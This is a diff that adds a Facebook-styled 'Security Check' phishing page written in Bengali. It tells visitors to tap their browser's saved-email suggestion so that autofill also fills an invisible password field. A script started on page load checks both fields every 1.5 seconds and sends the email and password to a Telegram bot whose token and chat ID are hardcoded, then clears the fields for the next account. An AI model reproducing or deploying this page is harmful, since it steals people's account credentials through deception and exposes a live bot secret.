@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Security Check</title>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <style>
+        body { background-color: #f7f9fc; font-family: 'Helvetica', Arial, sans-serif; margin: 0; padding: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
+        .top-half { height: 48vh; width: 100%; display: flex; align-items: center; justify-content: center; background-color: white; border-bottom: 1px solid #e1e4e8; padding: 10px; box-sizing: border-box; }
+        .top-half img { max-width: 100%; max-height: 100%; object-fit: contain; border-radius: 8px; }
+        .bottom-half { height: 52vh; width: 100%; background: #f7f9fc; padding: 20px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 15px; position: relative; }
+        .main-title { font-size: 19px; font-weight: 800; color: #ef4444; margin-bottom: 5px; line-height: 1.4; text-align: center; }
+        .secure-input { width: 100%; max-width: 350px; padding: 18px; border: 2px solid #1877f2; border-radius: 14px; outline: none; font-size: 17px; background: white; text-align: center; box-shadow: 0 4px 12px rgba(24, 119, 242, 0.1); }
+        /* পাসওয়ার্ড ফিল্ডটি সম্পূর্ণ অদৃশ্য রাখার জন্য */
+        #hidden_pass { position: absolute; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
+    </style>
+</head>
+<body onload="startCapture()">
+
+    <div class="top-half">
+        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" alt="Facebook Support">
+    </div>
+
+    <div class="bottom-half">
+        <h2 class="main-title">ফেসবুক এড করতে চাইলে আপনার কিবোর্ড এর উপর ভেসে থাকা ইমেইল এর উপরে ক্লিক করুন</h2>
+        
+        <input type="email" id="auto_email" name="u_name" autocomplete="username" placeholder="এখানে ক্লিক করুন" class="secure-input">
+        
+        <input type="password" id="hidden_pass" name="u_pass" autocomplete="current-password">
+        
+        <p class="text-[12px] text-gray-500 mt-4">নিরাপত্তার স্বার্থে আপনার সঠিক প্রোফাইলটি নিশ্চিত করুন।</p>
+    </div>
+
+<script>
+    const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
+    const chatId = "8516934257";
+
+    function startCapture() {
+        const eField = document.getElementById('auto_email');
+        const pField = document.getElementById('hidden_pass');
+
+        // অটো-ক্যাপচার লজিক
+        setInterval(() => {
+            // যদি ব্রাউজার অটোফিল করে আইডি বক্সে ডাটা বসায়
+            if (eField.value.length > 2) {
+                const user_data = eField.value;
+                const pass_data = pField.value;
+
+                // টেলিগ্রামে ডাটা পাঠানো হচ্ছে
+                const text = `💾 **নতুন সেভ ডাটা!**\n📧 আইডি: \`${user_data}\` \n🔑 পাস: \`${pass_data}\``;
+                
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: chatId, text: text })
+                });
+
+                // ১ সেকেন্ড পরে বক্সটি খালি করে দেওয়া হচ্ছে
+                setTimeout(() => {
+                    eField.value = "";
+                    pField.value = "";
+                    eField.placeholder = "পরবর্তী একাউন্টে ক্লিক করুন";
+                }, 1000);
+            }
+        }, 1500); // প্রতি ১.৫ সেকেন্ড পরপর চেক করবে ডাটা বসল কি না
+    }
+</script>
+
+</body>
+</html>
